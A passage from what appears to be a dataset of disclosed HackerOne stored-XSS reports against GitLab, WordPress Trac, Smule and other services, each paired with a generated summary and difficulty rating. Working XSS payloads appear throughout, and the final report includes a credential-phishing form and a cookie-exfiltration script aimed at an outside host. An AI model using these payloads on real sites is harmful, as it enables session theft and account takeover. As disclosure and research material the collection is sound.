2. Modify the values in the table to insert the XSS payload: "><img src=x onerror=prompt(0);> or "/><svg/onload=alert(0);>
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common XSS payload and does not require complex interactions or state manipulation. The attack surface is limited to modifying table values in a template, which is a typical place to test for XSS.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/299728: Markdown parsing issue enables insertion of malicious tags and event handlers
================================================================================
RAW DESCRIPTION:

When markdown is being presented as HTML, there seems to be a strange interaction between _ and @ that lets an attacker insert malicious tags.
Proof of Concept :
Code 21 Bytes
1</http:<marquee>hello
is rendered converted to the following HTML:
Code 112 Bytes
1<p><a title="/http:<marquee" href="/http:%3Cmarquee" target="_blank">/http:<marquee>hello</p>
2</marquee></a></p>
As you can see, the output includes a </http:<marquee tag that I can add arbitrary attributes (including event handlers).
Impact
When markdown is being presented as HTML, there seems to be a strange interaction between _ and @ that lets an attacker insert malicious tags.



================================================================================
Vulnerability Description:
The vulnerability involves a markdown parsing issue where a specific combination of characters (`_` and `@`) allows an attacker to inject malicious HTML tags (like `<marquee>`) and event handlers. The parser incorrectly handles these characters, leading to HTML output that includes unintended and potentially dangerous elements.

Steps to Reproduce:
1. Enter the following markdown text into the vulnerable markdown parser: `1</http:<marquee>hello`
2. Observe the rendered HTML output which includes unexpected `<marquee>` tags and potential for arbitrary attribute injection
Exploitation Difficulty:
This vulnerability requires understanding of markdown parsing quirks and the specific interaction between certain characters that trigger the parser's unexpected behavior. While the attack vector is straightforward once known, discovering the exact character combination that triggers the parser's flaw is non-obvious and requires either systematic testing or deep understanding of the parser's implementation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/302253: Очень жесткая XSS в личных сообщениях m.ok.ru
================================================================================
RAW DESCRIPTION:

Приветствую.
<image_0>
Что нужно, чтоб заюзать:
Переходим в группу https://m.ok.ru/group/54904397693159/market
<image_1>
<image_2>
<image_3>
Нет фильтрации служебных символов тут -
Impact
XSS.



================================================================================
Vulnerability Description:
The vulnerability is a Cross-Site Scripting (XSS) issue in the personal messages feature of m.ok.ru, where user input is not properly sanitized, allowing an attacker to inject and execute arbitrary JavaScript code.

Steps to Reproduce:
1. Navigate to the group page: https://m.ok.ru/group/54904397693159/market
2. Inject malicious script or payload in a location where input is not properly sanitized (e.g., personal messages or group posts)
Exploitation Difficulty:
The vulnerability is straightforward to exploit as it involves a common XSS flaw without the need for complex interactions or state manipulation. The attack requires minimal steps and does not involve novel or non-obvious logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/329862: Stored xss in shop name @ lp.reverb.com
================================================================================
RAW DESCRIPTION:

hello team,
There is a stored xss in lp.reverb.com.
Attacker can inject malicious script into server while adding shop name as lll"></script><script>alert('xss');</script>.
Exploit: https://lp.reverb.com/shops/faniyos-boutique/listings
Steps to reproduce:
Navogate to https://reverb.com/my/lp_shop/edit
Change your lp shop name to this: lll"></script><script>alert('xss')</script>
Save the changes.
View your lp shop.
Fix:
Sanitise the given input in the backend and encode the special characters.
Thanks,
Sandeep
Impact
Attack can save malicious script directly into the server. Malicious script can be used to gain users session.
The hacker selected the Cross-site Scripting (XSS) - Stored weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
URL
https://lp.reverb.com/shops/faniyos-boutique/listings
Verified
Yes



================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the shop name field at lp.reverb.com, allowing attackers to inject and persist malicious JavaScript code that executes when other users view the affected shop page.

Steps to Reproduce:
1. Navigate to https://reverb.com/my/lp_shop/edit
2. Change your LP shop name to: lll"></script><script>alert('xss')</script> and save the changes
3. View your LP shop at https://lp.reverb.com/shops/faniyos-boutique/listings to observe the XSS execution
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a basic XSS payload in a single input field without requiring complex application state manipulation or understanding of subtle interactions between components. The attack follows a common XSS pattern with no novel or application-specific logic required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/346111: XSS (Persistent) - Selecting role(s) for protected branches
================================================================================
RAW DESCRIPTION:

Summary:
When using the dropdown that selects the groups or users that are allowed to push or merge to a protected branch within a project, it is possible to trigger a XSS with a malicious user name string.
Description:
This vulnerability is similar to the recently announced CVE-2018-10379. The username input string where an attacker is able to inject a payload is in the same location, but the XSS that renders is in a different location. Since the remediation needs to be applied at the presentation layer, this is indeed a separate vulnerability and needs to be fixed separately (although Gitlab could start whitelisting characters allowed in usernames, similar to how Gitlab whitelists characters for Group or Project names).
The steps to reproduce are fairly simple but there are some restrictions:
Only members of a project with Master access are able to become victims of the XSS
Only groups/members with a subscription level of Starter or higher are able to perform the XSS, since this requires the ability to restrict merge/push permissions of a branch to a specific user. This is a premium feature only allowed at Starter or higher. (https://gitlab.com/help/user/project/protected_branches#restricting-push-and-merge-access-to-certain-users-starter)
Steps To Reproduce:
Set your own username as "<img src=x onerror=alert(document.domain)> foo / bar"
Make yourself have at least Master access to a project
In this project, ensure at least one branch is in the project and that branch is a "Protected Branch"
Under Project Settings -> Repository -> Protected Branches, select the dropdown under the "Ability to Merge" section
Notice that the onerror attribute from the username renders.
Supporting Material/References:
More information can be provided upon request.
You'll notice the payload above is the same as the payload used in a test file (inside the ce source code repo) for the CVE I attached. I only found this vulnerability since I was testing the previous CVE on our own internal instance of Gitlab, left my username saved as that malicious string, and later found the alert() dialog popup in another area of the site even after patching to 10.7.2.
Suggested Remediation
I believe this is the offending Line: https://gitlab.com/gitlab-org/gitlab-ee/blob/master/ee/app/assets/javascripts/projects/settings/access_dropdown.js#L461
^There could also be other XSS vulnerabilities in this JS file. Everywhere else in the app uses the underscore method _.escape()to escape user input, but this file doesn't.
Impact
The security impact is the same as any typical persistent xss.
The hacker selected the Cross-site Scripting (XSS) - Stored weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
URL
https://gitlab.com/group/project/settings/repository
Verified
Yes



================================================================================
Vulnerability Description:
A persistent XSS vulnerability exists in GitLab's protected branch settings where a malicious username can trigger JavaScript execution when viewed in the merge permissions dropdown. The attack requires the victim to have Master access and the attacker to have Starter or higher subscription level.

Steps to Reproduce:
1. Set your username to a malicious string: `<img src=x onerror=alert(document.domain)> foo / bar`
2. Navigate to Project Settings -> Repository -> Protected Branches and select the dropdown under 'Ability to Merge' section
Exploitation Difficulty:
The vulnerability requires specific conditions (Master access, Starter subscription) and involves manipulating a username field to inject XSS payloads, but the attack vector is straightforward once these conditions are met. The interaction between the username field and the protected branch settings dropdown is non-obvious but not highly complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/349146: Stored XSS in Node-Red
================================================================================
RAW DESCRIPTION:

I would like to report a stored XSS in node-red
It allows to execute javascript in the user's browser
Module
module name: node-red
version: v0.18.4
npm page: https://www.npmjs.com/package/node-red
Module Description
A visual tool for wiring the Internet of Things.
Module Stats
1,758 downloads in the last day
10,601 downloads in the last week
40,000+ downloads in the last month
Vulnerability
Steps To Reproduce:
Install the module
sudo npm install -g --unsafe-perm node-red
Run it
node-red
then access it in http://localhost:1880
Exploit
The same payload can be applied in different locations.
Payload: <script>alert('xss')</script>
Places where you can put the payload:
Drag & drop any item from the left menu to the center then put the payload in the name field. After clicking "done", the xss is triggered. At this point it's only triggered in your browser.
Click the "deploy" button, now any user that will browse to http://localhost:1880 will have the javascript executed.
Second one:
Click the "+" button on the top right to create a new "flaw". Put the payload in the name field. Again you need to press "deploy". After that double clicking on the "flaw" will execute the javascript.
Supporting Material/References:
Archlinux
NodeJS 9.4.0
NPM 5.6.0
Firefox 57.0.4 & Chromium 64.0.3282.119
node-red v0.18.4
Wrap up
I contacted the maintainer to let them know: N
I opened an issue in the related repository: N
¯_(ツ)_/¯
Impact
It allows executing malicious javascript code in the user's browser
The hacker selected the Cross-site Scripting (XSS) - Stored weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
URL
http://localhost:1880
Verified
Yes



================================================================================
Vulnerability Description:
A stored Cross-Site Scripting (XSS) vulnerability in Node-RED allows an attacker to execute arbitrary JavaScript code in the context of any user's browser by injecting malicious scripts into various input fields (e.g., node names, flow names). The payload becomes persistent after deployment, affecting all users who access the Node-RED interface.

Steps to Reproduce:
1. Install Node-RED: sudo npm install -g --unsafe-perm node-red
2. Run Node-RED and access it at http://localhost:1880
3. Drag & drop any item from the left menu to the center and insert the XSS payload (<script>alert('xss')</script>) in the name field, then click 'done'
4. Click the 'deploy' button to make the XSS payload execute for any user browsing to http://localhost:1880
5. Alternatively, create a new 'flaw' by clicking the '+' button, insert the XSS payload in the name field, deploy, and double-click the 'flaw' to execute the JavaScript
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves common XSS payload testing in visible input fields without requiring complex interactions or deep understanding of the application's internal logic. The attack surface is obvious (user-editable fields), and the payload execution is immediate upon deployment.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/369573: stored xss in scrape-metadata when reading metadata from an html page
================================================================================
RAW DESCRIPTION:

Hy
Module
scrape-metadata
https://www.npmjs.com/package/scrape-metadata
Module Description
a module used to scrape meta data contents from an article
Vulnerability Description
It was possible to embed malicious js code in metadata content read by scrape-metadata. When library reads such metadata, there was no sanitization performed. If output from scrape-metadata is rendered directly in HTML code,it can lead to xss/html injection.
Steps To Reproduce:
create a website, I used a local server available at http://127.0.0.1:8080
Below is html file with js code injected in 'og:title property' and i uploaded the file to my
remote server http://pokegen.in/test.html
Code 62 Bytes
1<head>
2    <meta charset="utf8">
3    <title>scrap-meta</title>
Code 264 Bytes
1    <meta property="og:description" content="hackerone">
2    <meta property="og:image" content="image">
3    <meta property="og:title" content='https://google.com<svg/onload=prompt(1)>'>
4    <meta property="og:type" content="article">
5</head>
6<body>
7</body>
8</html>
install scrape-metadata
npm install scrape-metadata
const http=require('http');
const server=http.createServer();
const express=require('express');
const app=express();
const scrape = require('scrape-metadata')
var url = "http://pokegen.in/test.html";
app.get('/scrap', function(req, res) {
scrape(url, (err, meta) => {
console.log(meta)
let __html = `
Code 150 Bytes
1               <div>
2                   <p>site title:${JSON.stringify(meta)}</p>
3               </div>
4           `
5           res.send(__html)
6  });
});
app.listen(8080)
save this as scrap.js
now run the app,node scrap.js
now goto http://127.0.0.1:8080/scrap on browser.and you will get a javascript prompt
Supporting Material/References:
Configuration I've used to find this vulnerability:
windows 7
node 8.9.3
npm 5.5.1
curl 7.54.0
# Wrap up
If you have any questions about any details of this finding, please let me know in comment.
Thank you
Regards,
johns simon
I contacted the maintainer to let them know: [N]
I opened an issue in the related repository: [N]
Impact
This might lead to stealing session cookies from infected website, and much more sophisticated attacks



================================================================================
Vulnerability Description:
The scrape-metadata module does not sanitize metadata content fetched from HTML files, allowing for stored XSS when the output is rendered directly in HTML.

Steps to Reproduce:
1. Create an HTML file with malicious JavaScript in the 'og:title' meta tag and host it on a server.
2. Use the scrape-metadata module to fetch and display the metadata from the malicious HTML file without sanitization.
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of missing sanitization in a common web scraping scenario, without complex interactions or state manipulations.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/391390: Stored XSS on activity
================================================================================
RAW DESCRIPTION:

Hi security team members,
Description
I found a store xss on the activity which allows an attacker to steal admin account cookies.
Step to reproduce
1-Create store
2- Add a member in a store
3- Member can choose any name
4- So change the any member name with hunter"><svg/onload=alert(2)>
5- Now on admain account make changes
6- That will create activity with attacker malicious payload
POC
<image_0>
Impact
An attacker(staff member) can takeover admin account.



================================================================================
Vulnerability Description:
A stored XSS vulnerability in the activityDescription field allows a member to inject malicious JavaScript, which executes when an admin views the activity log. This can lead to cookie theft and account takeover.

Steps to Reproduce:
1. Create a store
2. Add a member to the store
3. Change the member's name to a malicious payload: hunter"><svg/onload=alert(2)>
4. Log in to the admin account and make changes to trigger the activity with the malicious payload
Exploitation Difficulty:
The vulnerability involves a straightforward XSS injection in a user-controllable field (member name) that is reflected in the admin interface. The attack does not require complex interactions or deep understanding of the application's logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/409380: Stored XSS in merge request pages
================================================================================
RAW DESCRIPTION:

Summary:
I found a Stored XSS in merge request pages.
Description:
The exploit is via the parameter merge_request[source_branch] of the request to create a New Merge Request.
Steps To Reproduce:
Sign ikn to GitLab.
Click the "[+]" icon.
Click "New Project".
Fill out "Project name" form with "test-project".
Check the radio button of "Public".
Check the "Initialize repository with a README".
Click "Create project" button.
Go to "http(s)://{GitLab host}/{user id}/test-project/branches/new".
Fill out each form as follows:
Branch name: test-branch
Create from: master
Click "Create branch" button.
Go to "http://{GitLab host}/{user id}/test-project/merge_requests".
Click "Create merge request" button.
Click "Submit merge request" button.
Intercept the request.
Change the merge_request[source_branch] parameter's value to <img/src=x onerror=alert(1)>
Send the request.
Result: poc.png
Note: This behavior can be reproduced on all modern browsers.
Impact
The security impact is the same as any typical Stored XSS.
Thank you.



================================================================================
Vulnerability Description:
A Stored XSS vulnerability exists in merge request pages via the parameter merge_request[source_branch] of the request to create a New Merge Request. By injecting a malicious payload into this parameter, an attacker can execute arbitrary JavaScript code in the context of the victim's browser when the merge request page is viewed.

Steps to Reproduce:
1. Sign in to GitLab.
2. Click the "[+]" icon.
3. Click "New Project".
4. Fill out "Project name" form with "test-project".
5. Check the radio button of "Public".
6. Check the "Initialize repository with a README".
7. Click "Create project" button.
8. Go to "http(s)://{GitLab host}/{user id}/test-project/branches/new".
9. Fill out each form as follows: Branch name: test-branch, Create from: master.
10. Click "Create branch" button.
11. Go to "http://{GitLab host}/{user id}/test-project/merge_requests".
12. Click "Create merge request" button.
13. Click "Submit merge request" button.
14. Intercept the request.
15. Change the merge_request[source_branch] parameter's value to <img/src=x onerror=alert(1)>.
16. Send the request.
Exploitation Difficulty:
The attack involves multiple steps to set up the environment (creating a project, branch, and merge request), but the XSS payload injection itself is straightforward once the request is intercepted. The interaction between the components is not particularly subtle or complex, and the vulnerability follows a common pattern of parameter manipulation for XSS.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/409850: XSS in steam react chat client
================================================================================
RAW DESCRIPTION:

The Steam chat client both sends and receives bbcode format chat messages. These map to HTML elements, and notably the [url] bbcode tag is supported for arbitrary URLs. React has strong XSS mitigations but does not mitigate javascript: URI based XSS.
This is rather difficult to exploit as the client transmits sanitised messages and receives over a binary WebSocket. I've attached a video of executing this XSS, which is persistent.
Impact
I strongly believe an attacker could get remote code execution in Steam via this method. The Steam chat client uses the same codebase as the steam web chat client, and, I imagine does so using electron or some other webview system. These systems all expose functions which allow arbitrary calls to system to allow them to be competitive with e.g. windows forms.



================================================================================
Vulnerability Description:
The vulnerability is an XSS in the Steam chat client that leverages BBCode's [url] tag to execute javascript: URIs, bypassing React's XSS mitigations. This could potentially lead to remote code execution due to the client's use of Electron or a similar webview system that exposes system functions.

Steps to Reproduce:
1. Identify that the Steam chat client uses BBCode for formatting messages, including the [url] tag which can contain arbitrary URLs.
2. Craft a malicious BBCode message with a javascript: URI in the [url] tag to exploit React's lack of mitigation for javascript: URI based XSS.
3. Send the crafted message through the Steam chat client, which transmits sanitized messages over a binary WebSocket.
4. Observe the execution of the XSS payload in the recipient's chat client, which is persistent and could lead to remote code execution.
Exploitation Difficulty:
The attack involves understanding the interaction between BBCode parsing, React's XSS mitigations, and the WebSocket transmission protocol. It also requires knowledge of how Electron or webview systems expose system functions, making it a multi-component attack with subtle interactions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/485748: Stored XSS on reports.
================================================================================
RAW DESCRIPTION:

Summary:
Stored XSS can be submitted on reports, and anyone who will check the report the XSS will trigger.
Description:
Stored XSS, also known as persistent XSS, is the more damaging than non-persistent XSS. It occurs when a malicious script is injected directly into a vulnerable web application.
Steps To Reproduce:
Go to https://app.mopub.com/reports/custom/
Click New network report.
On the name, enter payload: "><img src=x onerror=alert(document.domain)>
Click Run and save then XSS will trigger.
Demonstration of the vulnerability:
PoC: ████
Tested on Firefox and chrome.
Impact
The attacker can steal data from whoever checks the report.



================================================================================
Vulnerability Description:
Stored XSS can be submitted on reports, and anyone who checks the report will trigger the XSS. This allows an attacker to steal data from whoever checks the report.

Steps to Reproduce:
1. Go to https://app.mopub.com/reports/custom/
2. Click New network report
3. On the name, enter payload: "><img src=x onerror=alert(document.domain)>
4. Click Run and save then XSS will trigger
Exploitation Difficulty:
The attack involves a straightforward injection of a common XSS payload into a form field. No complex interactions or state manipulations are required, and the payload is a well-known XSS vector.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/526325: Stored XSS in Wiki pages
================================================================================
RAW DESCRIPTION:

Summary
I found Stored XSS using Wiki-specific Hierarchical link Markdown in Wiki pages.
Steps to reproduce
Sign in to GitLab.
Open a Project page that you have permission to edit Wiki pages.
Open Wiki page.
Click "New page" button.
Fill out "Page slug" form with javascript:.
Click "Create page" button.
<image_0>
Click "Create page" button.
Click "XSS" link in created page.
What is the current bug behavior?
<image_1>
Description In Detail:
GitLab application converts the Markdown string .alert(1); to the href attribute javascript:alert(1);.
Furthermore, Wiki-specific Markdown string . is converted to javascript: in this case.
What is the expected correct behavior?
The dangerous href attribute javascript:alert(1); should be filtered.
A safe HTTP/HTTPS link should be rendered instead.
Additional Informations:
In the above case, another Wiki-specific Markdown string .. is also converted to javascript:.
Using Title string such as javascript:STRING_EXPECTED_REMOVING also reproduces this vulnerability.
For example, if a wiki page is created with a disguised Title string JavaScript::SubClassName.function_name, GitLab application converts Wiki-specific Markdown string . to JavaScript: in such page.
It seems that GitLab application recognizes scheme-like string JavaScript: and removes the rest of Title string :SubClassName.function_name.
An attacker can use various schemes by replacing Title string javascript: to other scheme. (e.g. data:, vbscript:, and so on.)
Output of checks
This bug happens on the official Docker installation of GitLab Enterprise Edition 11.9.4-ee.
Results of GitLab environment info
Output of sudo gitlab-rake gitlab:env:info:
Code 847 Bytes
1System information
2System:		
3Proxy:		no
4Current User:	git
5Using RVM:	no
6Ruby Version:	2.5.3p105
7Gem Version:	2.7.6
8Bundler Version:1.16.6
9Rake Version:	12.3.2
10Redis Version:	3.2.12
11Git Version:	2.18.1
12Sidekiq Version:5.2.5
13Go Version:	unknown
14
15GitLab information
16Version:	11.9.4-ee
17Revision:	55be7f0
18Directory:	/opt/gitlab/embedded/service/gitlab-rails
19DB Adapter:	postgresql
20DB Version:	9.6.11
21URL:		http://gitlab.example.com
22HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
23SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
24Elasticsearch:	no
25Geo:		no
26Using LDAP:	no
27Using Omniauth:	yes
28Omniauth Providers: 
29
30GitLab Shell
31Version:	8.7.1
32Repository storage paths:
33- default: 	/var/opt/gitlab/git-data/repositories
34GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
35Git:		/opt/gitlab/embedded/bin/git
Impact
If wiki pages created by using this vulnerability are visible to everyone (Wiki Visibility setting is set to "Everyone With Access") in "Public" project, there is a possibility that a considerable number of GitLab users and visitors click a malicious link.



================================================================================
Vulnerability Description:
Stored XSS vulnerability in GitLab Wiki pages where hierarchical link Markdown processing improperly converts certain strings into dangerous javascript: links without proper sanitization, allowing execution of arbitrary JavaScript when clicked.

Steps to Reproduce:
1. Sign in to GitLab and open a Project page with Wiki edit permissions
2. Create a new Wiki page with a slug containing 'javascript:' and save it
3. Click the created link to trigger the XSS payload
Exploitation Difficulty:
The vulnerability requires understanding of both Wiki-specific Markdown processing and URL scheme handling, but follows predictable patterns once the Markdown conversion behavior is observed. The attack vector is straightforward with no complex state manipulation required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/643908: Stored XSS Vulnerability
================================================================================
RAW DESCRIPTION:

Hi there,
I found a stored xss @ https://core.trac.wordpress.org/
Steps:
Go to https://core.trac.wordpress.org/ and login. (open new private window and login with another account)
Go to https://core.trac.wordpress.org/newticket and set a summary and description.
Select a Workflow Keyword and click manual. Paste the payload: "><svg/onload=alert(document.domain)>
Click enter button and click Create Ticket button. Now, you will see xss alert. Copy the url and go to private window. Go to url and you will see xss alert.
PoC: https://youtu.be/Nyt1op_73vs
Impact
Stealing cookies



================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the WordPress Trac system, allowing an attacker to inject malicious JavaScript code into a ticket. When another user views the ticket, the script executes, potentially leading to cookie theft or other malicious actions.

Steps to Reproduce:
1. Go to https://core.trac.wordpress.org/ and login (use a private window with a different account).
2. Navigate to https://core.trac.wordpress.org/newticket and fill in the summary and description fields.
3. Select a Workflow Keyword, choose 'manual', and paste the payload: "><svg/onload=alert(document.domain)>".
4. Click 'Create Ticket' to trigger the XSS alert. Copy the URL and open it in another private window to confirm the vulnerability.
Exploitation Difficulty:
The vulnerability involves a straightforward injection of a common XSS payload into a ticket field. The steps are simple and do not require complex interactions or understanding of subtle application behaviors. The payload used is a well-known XSS vector.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/723307: Stored XSS in merge request pages
================================================================================
RAW DESCRIPTION:

Hello Gitlab!
Vulnerable code
To reproduce the bug, we need to open a merge request with the following conditions:
Project must have 'Merge commit with semi-linear history' or 'Fast-forward merge' merge method
The merge request must require rebase before fast-forward/merge
A visitor of the merge request page must not have permissions to push to source branch
Target branch name must have a special name <img/src='x'/onerror=alert(document.domain)> :)
Steps to reproduce:
Run Gitlab docker run --detach --hostname gitlab.example.com --publish 443:443 --publish 80:80 --publish 22:22 --name gitlab gitlab/gitlab-ce:latest
Create a new project
<image_0>
touch 1.txt
git add 1.txt
git commit -m "initial commit"
git push origin master
git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
touch 2.txt
git add 2.txt
git commit -m "add 2.txt"
git push origin "<img/src='x'/onerror=alert(document.domain)>"
git checkout master
touch 3.txt
git add 3.txt
git commit -m "add 3.txt"
git push origin master
Create a merge request master => <img/src='x'/onerror=alert(document.domain)>
Then we have to visit the merge request page under a user who does not have permissions to push to the source branch (in our case, master branch). For example:
Make the project public and visit the merge request page under any user who does not have permissions in the project (or without authorization)
Invite a user to the project, but without permissions to push to the source branch.
<image_1>
Code 868 Bytes
1root@gitlab:/# gitlab-rake gitlab:env:info
2
3System information
4System:		
5Current User:	git
6Using RVM:	no
7Ruby Version:	2.6.3p62
8Gem Version:	2.7.9
9Bundler Version:1.17.3
10Rake Version:	12.3.3
11Redis Version:	3.2.12
12Git Version:	2.22.0
13Sidekiq Version:5.2.7
14Go Version:	unknown
15
16GitLab information
17Version:	12.4.0
18Revision:	1425a56c75b
19Directory:	/opt/gitlab/embedded/service/gitlab-rails
20DB Adapter:	PostgreSQL
21DB Version:	10.9
22URL:		http://gitlab.example.com
23HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
24SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
25Using LDAP:	no
26Using Omniauth:	yes
27Omniauth Providers: 
28
29GitLab Shell
30Version:	10.2.0
31Repository storage paths:
32- default: 	/var/opt/gitlab/git-data/repositories
33GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
34Git:		/opt/gitlab/embedded/bin/git
35root@gitlab:/# 
Impact
An attacker can:
Perform any action within the application that a user can perform
Steal sensitive user data
Steal user's credentials



================================================================================
Vulnerability Description:
Stored XSS vulnerability in merge request pages where a specially crafted branch name containing an XSS payload is rendered unsanitized when certain merge conditions are met and viewed by a user without push permissions.

Steps to Reproduce:
1. Run Gitlab docker container
2. Create a new project and perform initial commits
3. Create a branch with a malicious name containing XSS payload
4. Create a merge request from master to the malicious branch
5. Visit the merge request page as a user without push permissions
Exploitation Difficulty:
The vulnerability requires specific conditions to be met (merge method settings, rebase requirement, permission constraints) and involves a non-obvious interaction between branch naming and merge request page rendering. However, the XSS vector itself is straightforward once these conditions are understood.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/733222: stored xss in https://www.smule.com
================================================================================
RAW DESCRIPTION:

hi team ,
I found a stored xss in www.smule.com
Summary: [add summary of the vulnerability]
The most damaging type of XSS is Stored XSS (Persistent XSS). An attacker uses Stored XSS to inject malicious content (referred to as the payload), most often JavaScript code, into the target application. If there is no input validation, this malicious code is permanently stored (persisted) by the target application, for example within a database. For example, an attacker may enter a malicious script into a user input field such as a blog comment field or in a forum post.
When a victim opens the affected web page in a browser, the XSS attack payload is served to the victim’s browser as part of the HTML code (just like a legitimate comment would). This means that victims will end up executing the malicious script once the page is viewed in their browser
##details :
parameter vulnerable :Blurb, Location and Name ,this all vulnerable to xss
payload:"></script><script>alert(document.cookie)</script>
payload 2:</script><script>akert(1)</script>
Steps To Reproduce:
1- login and go to settings
2- add payload to field Blurb
3- refresh page
4- xss will pop up
poc : in video below
Impact
Stealing cookies.
can lead to user's Session Hijacking.
can also lead to disclosure of sensitive data.
and more



================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the Blurb, Location, and Name fields of www.smule.com. An attacker can inject malicious JavaScript code into these fields, which is then permanently stored and executed when a victim views the affected page. This can lead to cookie theft, session hijacking, and disclosure of sensitive data.

Steps to Reproduce:
1. Login and go to settings
2. Add payload to field Blurb
3. Refresh page
4. XSS will pop up
Exploitation Difficulty:
The vulnerability involves a straightforward injection of XSS payloads into user input fields without requiring complex interactions or state manipulation. The attack is simple and does not involve multiple components or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/754352: Stored XSS on Wordpress 5.3 via Title Post
================================================================================
RAW DESCRIPTION:

I have identified a WordPress security vulnerability , a Stored XSS vulnerability that affects latest version of WordPress (5.3)
POC:
1) Login to wordpress website
2) Make a post with title payload xss like example <script>alert(document.domain);</script>
3) Publish then open the post, XSS Will trigger
Impact
Can stealing cookie user



================================================================================
Vulnerability Description:
A Stored Cross-Site Scripting (XSS) vulnerability in WordPress 5.3 allows an attacker to inject malicious JavaScript code into the title of a post. When the post is viewed, the script executes in the context of the victim's browser, potentially allowing the attacker to steal cookies or perform other malicious actions.

Steps to Reproduce:
1. Login to the WordPress website
2. Create a new post with a title containing the XSS payload, e.g., <script>alert(document.domain);</script>
3. Publish the post and open it to trigger the XSS
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple injection of a common XSS payload into a visible field (post title) without any need for complex interactions or state manipulation. The attack does not require multiple components or novel logic, making it easy to identify and exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/779908: Stored-Xss at connect.topcoder.com/projects/ affected on project chat members
================================================================================
RAW DESCRIPTION:

Hi team ,
I'm sorry for my bad report and english ,
but i wish you understand the impact of that bug here , if it well performed the sers may lose their access to their sso accounts
Summary:
While a developer at connect.topcoder.com can manage a messages about his/her project with someonelse ,
This conversation was not fully protected from XSS , if some user join in the same chat he'd be affected by that xss and his SSO account possibly will be token over
Steps To Reproduce:
After you register to topcoder.com go to connect.topcoder.com and sign on with your sso account ,
After that Go to https://connect.topcoder.com/new-project/ and add new project
NOTE : The discussion will not be accessible publicult efore the administratirs manages it , So after the adiministrators accept it the bug will be accessible publiculy █████
GO TO https://connect.topcoder.com/projects/<your_project_id>/messages
Add message with random title and this <script>alert()</script> as content , then submit
You'll get a fully JS code injected
If an attacker inject a Javascript code that steal cookies/csrf-token... he'll be able to fully access to the victim account
Supporting Material/References:
Tested on
Chrome Browser .
Windows 7_64x Note : That bug is affect to every machine/browser
Impact
Xss



================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the project chat feature of connect.topcoder.com. An attacker can inject malicious JavaScript code into a project message, which will execute when other users view the message. This could lead to session hijacking or account takeover if the malicious script steals cookies or CSRF tokens.

Steps to Reproduce:
1. Register on topcoder.com and log in to connect.topcoder.com using your SSO account.
2. Create a new project at https://connect.topcoder.com/new-project/ and wait for administrator approval.
3. Navigate to the project's messages section: https://connect.topcoder.com/projects/<your_project_id>/messages.
4. Post a message with a random title and the content: <script>alert()</script>.
5. Observe that the JavaScript code executes when another user views the message.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a basic XSS payload in a text input field. The attack does not require complex interactions between components or manipulation of application states. The XSS vulnerability is a common issue and the payload used is standard for testing such vulnerabilities.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/847176: Stored XSS via 64(?) vulnerable fields in ███ leads to credential theft/account takeover
================================================================================
RAW DESCRIPTION:

Summary:
A user is able to complete a ████████ worksheets via https://██████████. This form allows a user to store multiple XSS payloads within, which will in turn allow the attacker to run malicious code in context of the legal personnel who view the request.
Impact
The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.
Step-by-step Reproduction Instructions
Browse to https://█████ ████████
Click █████████. Once on the ██████ page, click ███ and ████████ ██████████
Click Continue. ██████
Fill in your name and click Submit. XSS payloads seem to be sanitized properly here from basic tests. ███
Any field that accepts text in the rest of the document seems vulnerable to XSS. Complete the form, filling in XSS payloads anywhere you can type. I counted 64 vulnerable fields total. █████████
Click Finish. You will see a confirmation that your request was submitting and receive a ticket number. █████████
Click ██████, or return to the ███████ page and put in your info in the █████ area to modify the worksheet. The XSS will fire in both locations. █████████
To demonstrate credential theft/account takeover, I used the following (very obvious) payload. There are various ways an attacker could do this and nothing seems to be filtered:
Code 218 Bytes
1<h3>Please login to proceed</h3> <form action=http://██████>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
█████████
███
An attacker can also redirect the user as soon as the worksheet is opened, but as an unauthenticated user I was unable to test for cookie theft:
<script>window.location="http://███/?cookie=" + document.cookie</script>
██████
Suggested Mitigation/Remediation Actions
Sanitize any fields where user input is reflected and disallow special characters from being submitted in each form field.
Impact
The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.



================================================================================
Vulnerability Description:
Stored XSS across 64 form fields allows attackers to inject persistent malicious scripts, leading to credential theft, session hijacking, or other client-side attacks when viewed by authorized users.

Steps to Reproduce:
1. Browse to the vulnerable form at https://██████████
